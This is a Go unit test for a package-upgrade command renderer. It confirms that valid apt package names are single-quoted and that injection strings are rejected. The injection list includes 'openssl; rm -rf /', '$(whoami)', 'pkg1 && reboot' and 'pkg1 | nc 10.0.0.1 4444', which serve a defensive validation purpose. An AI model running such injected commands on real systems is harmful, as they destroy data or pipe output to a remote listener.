package patcher

import (
	"errors"
	"strings"
	"testing"
)

func TestRenderSelectedUpgradeCommand_AllowsValidPackagesAndRejectsInjections(t *testing.T) {
	tpl := "apt-get -y install --only-upgrade -- {{packages}}"

	validPkgs := []string{
		"openssl",
		"libstdc++6",
		"g++",
		"linux-image-6.1.0-21-amd64",
		"bind9_1:9.18.28~deb12u1",
	}

	rendered, err := RenderSelectedUpgradeCommand(tpl, validPkgs)
	if err != nil {
		t.Fatalf("unexpected error for valid packages: %v", err)
	}
	if !strings.Contains(rendered, "'libstdc++6'") || !strings.Contains(rendered, "'linux-image-6.1.0-21-amd64'") {
		t.Fatalf("expected single-quoted package tokens, got %q", rendered)
	}

	injections := []string{
		"",
		"; id",
		"openssl; rm -rf /",
		"$(whoami)",
		"`id`",
		"pkg1 && reboot",
		"pkg1 | nc 10.0.0.1 4444",
		"--allow-unauthenticated",
		"-o",
		"pkg with space",
		"pkg\nnewline",
		"pkg'quote",
		strings.Repeat("a", 129),
	}

	for _, bad := range injections {
		_, err := RenderSelectedUpgradeCommand(tpl, []string{"openssl", bad})
		if err == nil {
			t.Fatalf("expected InvalidPackageNameError for %q, got nil", bad)
		}
		var pkgErr *InvalidPackageNameError
		if !errors.As(err, &pkgErr) {
			t.Fatalf("expected *InvalidPackageNameError for %q, got %T (%v)", bad, err, err)
		}
	}
}

